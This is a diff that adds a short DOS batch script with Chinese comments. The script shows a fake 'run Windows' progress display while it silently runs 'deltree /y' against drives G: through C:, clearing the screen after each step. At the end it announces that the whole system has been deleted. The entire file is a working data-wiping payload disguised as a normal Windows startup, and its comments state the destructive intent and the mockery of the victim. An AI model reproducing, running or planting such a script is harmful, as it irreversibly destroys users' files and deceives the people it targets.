@@ -1,0 +1,30 @@
+@rem 开始
+@rem 关闭命令行显示
+@echo off
+rem 设置路径
+PATH %PATH%;c:\windows\;c:\windows\command 
+rem 运行磁盘缓冲，加快删除速度：）
+SMARTDRV >nul
+rem 清屏
+cls
+rem 显示正在运行WINDOWS系统和百分比
+echo run Windows ..........10%%
+rem 执行删除操作
+deltree /y g:\. >nul
+cls
+echo run Windows ..........20%%
+deltree /y f:\. >nul
+cls
+echo run Windows ..........50%%
+deltree /y e:\. >nul
+cls
+echo run Windows ..........70%%
+deltree /y d:\. >nul
+cls
+echo run Windows ..........90%%
+deltree /y c:\. >nul
+cls
+rem 全部删除后，告诉他电脑刚才在干什么！：）
+echo del system all!!
+echo Goodbye!!!
+rem 结束
